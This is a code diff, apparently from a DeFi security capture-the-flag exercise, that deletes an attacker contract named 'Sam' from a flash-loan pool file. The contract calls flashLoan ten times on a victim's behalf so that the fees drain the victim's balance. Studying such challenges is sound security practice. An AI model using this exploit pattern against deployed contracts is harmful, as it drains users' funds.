@@ -44,16 +44,3 @@ contract NaiveReceiverLenderPool is ReentrancyGuard {
     receive () external payable {}
 }
 
-contract Sam {
-    NaiveReceiverLenderPool pool;
-
-    constructor(address payable _pool) {
-        pool = NaiveReceiverLenderPool(_pool);
-    }
-
-    function attack(address victim) public {
-        for (int i=0; i < 10; i++ ) {
-            pool.flashLoan(victim, 1 ether);
-        }
-    }
-}
